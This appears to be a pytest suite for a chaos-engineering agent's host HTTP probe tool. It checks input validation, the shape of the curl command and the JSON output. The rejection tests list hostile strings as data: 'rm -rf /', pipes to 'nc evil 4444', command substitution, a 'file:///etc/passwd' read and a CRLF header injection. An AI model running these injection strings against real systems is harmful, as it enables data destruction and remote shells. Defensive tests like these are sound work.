"""Tests for ``chaos_agent.tools.host_http_probe_cli`` — the HOST-delivered
sibling of the typed L7 ``http_probe``.

``http_probe`` cured the k8s Case #84 gap (an LLM-hand-written
``kubectl_read exec ... curl`` was rejected by the read-only screen AND
invisible to the metric extractor). That cure was k8s-only: it hard-binds
delivery to ``kubectl exec`` into an ``origin_pod``. A bare-host fault, or an
application-side (``scope=python``) HTTP fault reached from the host, has no
client pod — its verifier could only hand-write a ``host_read`` curl whose bare
text the extractor cannot parse, starving the cross-check the same way.

``host_http_probe`` closes that host face. It is deliberately a THIN sibling:
the validators and parsers are IMPORTED from ``http_probe_cli`` (single source,
no drift), the command shape is resolved through the SAME typed-probe registry,
and delivery reuses the sanctioned ``_run_host_diagnostic`` host seam. The
contracts pinned here map to that design:

  1. FAIL-CLOSED INPUT VALIDATION is the real safety boundary (the classifier
     trusts the tool BY NAME), and it is the SAME boundary ``http_probe`` uses.
  2. FRAMEWORK-OWNED, SHELL-FREE COMMAND SHAPE resolved via the probe registry
     and delivered through ``_run_host_diagnostic`` (host profile, skip_guard).
  3. PROBE-MODE discriminator: a non-zero curl exit WITH stdout is the probe's
     own answer (the fault landed), returned as born-structured JSON — never
     dressed as a channel error; an EMPTY stdout IS an honest error.
  4. BORN-STRUCTURED OUTPUT with the canonical metric keys the shared extractor
     and cross-check consume (byte-for-byte the ``http_probe`` set).
"""

from __future__ import annotations

import json

import pytest

from chaos_agent.agent.nodes.execute._effect_probes import HTTP_BODY_SENTINEL
from chaos_agent.models.command_result import CommandResult
from chaos_agent.tools import host_http_probe_cli
from chaos_agent.tools.host_http_probe_cli import host_http_probe


# ---------------------------------------------------------------------------
# Delivery recorder — stands in for ``_run_host_diagnostic`` and returns a
# CommandResult (the shape the tool inspects: .exit_code / .stdout / .stderr).
# ---------------------------------------------------------------------------


class _Recorder:
    def __init__(self, stdout: str = "", exit_code: int = 0, stderr: str = ""):
        self.canned = CommandResult(
            exit_code=exit_code, stdout=stdout, stderr=stderr, duration_ms=5.0,
        )
        self.calls: list[tuple] = []

    async def __call__(self, command, state, task_id):
        self.calls.append((command, state, task_id))
        return self.canned


@pytest.fixture
def recorder(monkeypatch):
    rec = _Recorder(
        stdout="connect=0.004 starttransfer=0.011 http=200 exit=0 len=42\n"
    )
    monkeypatch.setattr(host_http_probe_cli, "_run_host_diagnostic", rec)
    return rec


# ---------------------------------------------------------------------------
# 1. Fail-closed input validation (the real safety boundary) — the SAME
#    allowlists http_probe uses, imported from http_probe_cli.
# ---------------------------------------------------------------------------


class TestUrlValidationFailClosed:
    @pytest.mark.parametrize("bad_url", [
        "http://svc/health; rm -rf /",       # command injection
        "http://svc/health && curl evil",    # shell metacharacters
        "http://svc/health`id`",             # backtick substitution
        "http://svc/$(whoami)",              # command substitution
        "http://svc/health?a=1&b=2",         # query string (out of scope)
        "http://svc/health#frag",            # fragment (out of scope)
        "ftp://svc/file",                    # non-http scheme
        "file:///etc/passwd",                # local file read
        "http://svc/hea lth",                # whitespace
        "http://svc/health|nc evil 4444",    # pipe
        "not-a-url",                         # no scheme
        "",                                  # empty
    ])
    async def test_bad_url_rejected_before_delivery(self, recorder, bad_url):
        result = await host_http_probe.ainvoke({"url": bad_url})
        assert result.startswith("Error:"), result
        # the host command must never be built/delivered for a rejected url
        assert recorder.calls == []

    @pytest.mark.parametrize("good_url", [
        "http://svc/health",
        "http://backend:8080/live",
        "https://api.example.com/v1/status",
        "http://10.0.0.5:8080/",
    ])
    async def test_clean_url_accepted(self, recorder, good_url):
        result = await host_http_probe.ainvoke({"url": good_url})
        assert not result.startswith("Error:"), result
        assert len(recorder.calls) == 1


class TestMaxTimeBounds:
    @pytest.mark.parametrize("bad_t", [0, -1, 61, 999])
    async def test_out_of_range_int_max_time_rejected_in_body(self, recorder, bad_t):
        result = await host_http_probe.ainvoke({
            "url": "http://svc/health", "max_time": bad_t,
        })
        assert result.startswith("Error:"), result
        assert recorder.calls == []

    @pytest.mark.parametrize("bad_t", ["abc", None, 3.5])
    async def test_non_int_max_time_rejected_by_schema(self, recorder, bad_t):
        from pydantic_core import ValidationError

        with pytest.raises(ValidationError):
            await host_http_probe.ainvoke({
                "url": "http://svc/health", "max_time": bad_t,
            })
        assert recorder.calls == []

    @pytest.mark.parametrize("good_t", [1, 10, 60])
    async def test_in_range_max_time_accepted(self, recorder, good_t):
        result = await host_http_probe.ainvoke({
            "url": "http://svc/health", "max_time": good_t,
        })
        assert not result.startswith("Error:"), result


class TestCaptureFailClosed:
    @pytest.mark.parametrize("bad_capture", [
        "HEADERS", "Metadata", "everything", "body;rm -rf /", "",
        "-o", "header", "body all", "Metadata\n",
    ])
    async def test_unknown_capture_rejected_before_delivery(self, recorder, bad_capture):
        result = await host_http_probe.ainvoke({
            "url": "http://svc/health", "capture": bad_capture,
        })
        assert result.startswith("Error:"), result
        assert "capture" in result
        assert recorder.calls == []


class TestResolveValidationFailClosed:
    @pytest.mark.parametrize("bad_resolve", [
        "drill-echo.example.com:80:22.10.85.9; rm -rf /",    # command injection
        "drill-echo.example.com:80:22.10.85.9 && curl evil", # shell metachars
        "drill-echo.example.com:80:22.10.85.9|nc x 4444",    # pipe
        "drill-echo.example.com:80:22.10.85.9\nX-Inj: yes",  # CRLF header inject
        "drill-echo.example.com:80:22.10.85.9 extra",        # trailing token
        "drill-echo.example.com:0:22.10.85.9",               # port 0
        "drill-echo.example.com:99999:22.10.85.9",           # port > 65535
        "drill-echo.example.com:80:999.10.85.9",             # octet > 255
        "drill-echo.example.com:80:22.10.85",                # not a dotted-quad
        "drill-echo.example.com:22.10.85.9",                 # missing port
        ":80:22.10.85.9",                                    # empty host
        "drill-echo.example.com:80:22.10.85.9\n",            # trailing newline
    ])
    async def test_bad_resolve_rejected_before_delivery(self, recorder, bad_resolve):
        result = await host_http_probe.ainvoke({
            "url": "http://drill-echo.example.com/", "resolve": bad_resolve,
        })
        assert result.startswith("Error:"), result
        assert "resolve" in result
        assert recorder.calls == []

    @pytest.mark.parametrize("good_resolve", [
        "drill-echo.example.com:80:22.10.85.9",
        "a:443:10.0.0.1",
        "svc.local:8080:172.16.0.5",
    ])
    async def test_clean_resolve_accepted(self, recorder, good_resolve):
        result = await host_http_probe.ainvoke({
            "url": "http://drill-echo.example.com/", "resolve": good_resolve,
        })
        assert not result.startswith("Error:"), result
        assert len(recorder.calls) == 1


# ---------------------------------------------------------------------------
# 2. Framework-owned, shell-free command shape + host delivery delegation.
# ---------------------------------------------------------------------------


class TestCommandShapeAndDelivery:
    async def test_command_is_single_shell_free_curl(self, recorder):
        # The command handed to the host seam is the framework-built canonical
        # curl: ONE argv command, no shell pipe (the exec-form channel runs no
        # shell, so a pipe would be a useless literal AND a mutation risk).
        import shlex

        await host_http_probe.ainvoke({"url": "http://svc/health"})
        command = recorder.calls[0][0]
        assert "|" not in command
        assert ";" not in command
        assert "&&" not in command
        argv = shlex.split(command)
        assert argv[0] == "curl"
        assert "-o" in argv and "/dev/null" in argv  # metadata discards body

    async def test_state_and_task_id_thread_through(self, recorder):
        # The host seam needs the graph state (transport target) and the task_id
        # (audit attribution). ``state`` is InjectedState (runtime-supplied, so a
        # direct ainvoke leaves it None); ``task_id`` is LLM-writable and must
        # reach _run_host_diagnostic verbatim.
        await host_http_probe.ainvoke({
            "url": "http://svc/health", "task_id": "tc-42",
        })
        _command, _state, task_id = recorder.calls[0]
        assert task_id == "tc-42"

    async def test_resolve_threads_into_curl_just_before_url(self, recorder):
        await host_http_probe.ainvoke({
            "url": "http://drill-echo.example.com/",
            "resolve": "drill-echo.example.com:80:22.10.85.9",
        })
        command = recorder.calls[0][0]
        assert (
            "--resolve drill-echo.example.com:80:22.10.85.9 "
            "http://drill-echo.example.com/" in command
        )
        assert command.rstrip().endswith("http://drill-echo.example.com/")

    async def test_absent_resolve_is_byte_identical(self, recorder):
        await host_http_probe.ainvoke({"url": "http://svc/health"})
        command = recorder.calls[0][0]
        assert "--resolve" not in command
        result = await host_http_probe.ainvoke({"url": "http://svc/health"})
        assert "resolve" not in json.loads(result)


class TestCaptureCommandShape:
    async def test_metadata_discards_body(self, recorder):
        await host_http_probe.ainvoke({"url": "http://svc/health"})
        command = recorder.calls[0][0]
        assert "-o /dev/null" in command
        assert "headers=%{header_json}" not in command
        assert "head -c" not in command

    async def test_headers_keeps_discard_sink_adds_header_json(self, recorder):
        await host_http_probe.ainvoke({
            "url": "http://svc/health", "capture": "headers",
        })
        command = recorder.calls[0][0]
        assert "-o /dev/null" in command
        assert "headers=%{header_json}" in command
        assert "head -c" not in command

    async def test_body_streams_stdout_with_sentinel_no_pipe(self, recorder):
        await host_http_probe.ainvoke({
            "url": "http://svc/health", "capture": "body",
        })
        command = recorder.calls[0][0]
        assert "-o /dev/null" not in command
        assert HTTP_BODY_SENTINEL in command
        assert "head -c" not in command
        assert "|" not in command
        assert command.rstrip().endswith("http://svc/health")

    async def test_all_streams_body_and_headers_no_pipe(self, recorder):
        await host_http_probe.ainvoke({
            "url": "http://svc/health", "capture": "all",
        })
        command = recorder.calls[0][0]
        assert "-o /dev/null" not in command
        assert HTTP_BODY_SENTINEL in command
        assert "headers=%{header_json}" in command
        assert "|" not in command


# ---------------------------------------------------------------------------
# 3. Probe-mode discriminator + 4. born-structured output.
# ---------------------------------------------------------------------------


class TestOutputAndProbeMode:
    async def test_output_is_born_structured_json(self, recorder):
        result = await host_http_probe.ainvoke({"url": "http://svc/health"})
        data = json.loads(result)
        assert data["tool"] == "host_http_probe"
        assert data["url"] == "http://svc/health"
        assert data["capture"] == "metadata"
        assert data["http_code"] == "200"
        assert data["time_connect"] == "0.004"
        assert data["time_starttransfer"] == "0.011"
        assert data["exit_code"] == "0"
        assert data["size_download"] == "42"

    async def test_faulted_target_reported_as_data_not_error(self, monkeypatch):
        # A refused connection (exit 7 / http 000) is the OBSERVATION that the
        # fault is live — curl still prints its write-out, so non-empty stdout
        # makes it DATA, never an "Error:" that reads as a channel fault. This
        # is the probe-mode discriminator mirrored from _kubectl_impl.
        monkeypatch.setattr(
            host_http_probe_cli, "_run_host_diagnostic",
            _Recorder(
                stdout="connect=0.000 starttransfer=0.000 http=000 exit=7 len=0\n",
                exit_code=7,
            ),
        )
        result = await host_http_probe.ainvoke({"url": "http://svc/health"})
        assert not result.startswith("Error:"), result
        data = json.loads(result)
        assert data["http_code"] == "000"
        assert data["exit_code"] == "7"

    async def test_empty_stdout_nonzero_exit_stays_error(self, monkeypatch):
        # Host unreachable / curl missing writes stderr only ⇒ empty stdout ⇒
        # an honest "Error:", NOT a dressed-up empty measurement.
        monkeypatch.setattr(
            host_http_probe_cli, "_run_host_diagnostic",
            _Recorder(stdout="", exit_code=127, stderr="curl: command not found"),
        )
        result = await host_http_probe.ainvoke({"url": "http://svc/health"})
        assert result.startswith("Error:"), result
        assert "command not found" in result

    async def test_no_recognised_write_out_surfaces_raw(self, monkeypatch):
        # The command ran (non-empty stdout) but produced no write-out fields —
        # surface the raw output rather than a silent empty probe.
        monkeypatch.setattr(
            host_http_probe_cli, "_run_host_diagnostic",
            _Recorder(stdout="curl: (6) Could not resolve host: svc\n", exit_code=6),
        )
        result = await host_http_probe.ainvoke({"url": "http://svc/health"})
        assert result.startswith("Error:"), result
        assert "Could not resolve host" in result

    async def test_profile_mismatch_is_error(self, monkeypatch):
        # A non-host channel answering (profile mismatch) is a real channel
        # fault, never a measurement.
        from chaos_agent.transports.executor import PROFILE_MISMATCH_EXIT_CODE

        monkeypatch.setattr(
            host_http_probe_cli, "_run_host_diagnostic",
            _Recorder(
                stdout="", exit_code=PROFILE_MISMATCH_EXIT_CODE,
                stderr="channel is not a host profile",
            ),
        )
        result = await host_http_probe.ainvoke({"url": "http://svc/health"})
        assert result.startswith("Error:"), result
        assert "not a host profile" in result


class TestCaptureOutputSchema:
    async def test_metadata_schema_has_no_headers_body(self, recorder):
        result = await host_http_probe.ainvoke({"url": "http://svc/health"})
        data = json.loads(result)
        assert data["capture"] == "metadata"
        assert "headers" not in data
        assert "body" not in data

    async def test_headers_recovers_multiline_space_bearing_json(self, monkeypatch):
        monkeypatch.setattr(host_http_probe_cli, "_run_host_diagnostic", _Recorder(
            stdout=(
                "connect=0.004 starttransfer=0.011 http=200 exit=0 len=42 "
                "headers={\n"
                '  "Date": ["Mon, 26 Oct 2026 00:00:00 GMT"],\n'
                '  "X-Drill-Injected": ["true"]\n'
                "}\n"
            ),
        ))
        result = await host_http_probe.ainvoke({
            "url": "http://svc/health", "capture": "headers",
        })
        data = json.loads(result)
        assert data["capture"] == "headers"
        assert "body" not in data
        assert data["http_code"] == "200"
        hdrs = json.loads(data["headers"])
        assert hdrs["X-Drill-Injected"] == ["true"]
        assert hdrs["Date"] == ["Mon, 26 Oct 2026 00:00:00 GMT"]

    async def test_body_splits_verbatim_on_sentinel(self, monkeypatch):
        monkeypatch.setattr(host_http_probe_cli, "_run_host_diagnostic", _Recorder(
            stdout=(
                '{"status":"TAMPERED"}\n'
                f"{HTTP_BODY_SENTINEL}\n"
                "connect=0.004 starttransfer=0.011 http=200 exit=0 len=19\n"
            ),
        ))
        result = await host_http_probe.ainvoke({
            "url": "http://svc/health", "capture": "body",
        })
        data = json.loads(result)
        assert data["capture"] == "body"
        assert "headers" not in data
        assert data["body"] == '{"status":"TAMPERED"}'
        assert data["http_code"] == "200"

    async def test_resolve_appears_in_provenance(self, recorder):
        result = await host_http_probe.ainvoke({
            "url": "http://drill-echo.example.com/",
            "resolve": "drill-echo.example.com:80:22.10.85.9",
        })
        data = json.loads(result)
        assert data["resolve"] == "drill-echo.example.com:80:22.10.85.9"


# ---------------------------------------------------------------------------
# Cross-source consistency: the metric keys this tool emits MUST be byte-for-byte
# the http_probe set, or the shared _metric_extractor._parse_http_probe and the
# deterministic cross-check would look up a key the timeline never carries.
# ---------------------------------------------------------------------------


class TestMetricKeyParityWithHttpProbe:
    async def test_emits_exactly_the_http_probe_metric_keys(self, recorder):
        from chaos_agent.tools.http_probe_cli import _W_NAME_TO_METRIC

        result = await host_http_probe.ainvoke({"url": "http://svc/health"})
        data = json.loads(result)
        canonical = set(_W_NAME_TO_METRIC.values())
        assert canonical <= set(data), f"missing metric keys: {canonical - set(data)}"

    def test_extractor_routes_host_http_probe_by_tool_name(self):
        # The read-end wiring: extract_metrics dispatches on tool NAME for both
        # L7 probes, so a host_http_probe JSON lands on the cross-check timeline
        # (the leg a hand-written host_read curl could never traverse).
        from chaos_agent.agent.nodes.verify._metric_extractor import extract_metrics

        body = json.dumps({
            "tool": "host_http_probe", "url": "http://svc/health",
            "http_code": "503", "time_connect": "0.004",
            "time_starttransfer": "0.011", "size_download": "0",
            "exit_code": "0",
        })
        assert extract_metrics("host_http_probe", "host_http_probe", body) == {
            "http_code": "503", "time_connect": "0.004",
            "time_starttransfer": "0.011", "size_download": "0",
            "exit_code": "0",
        }
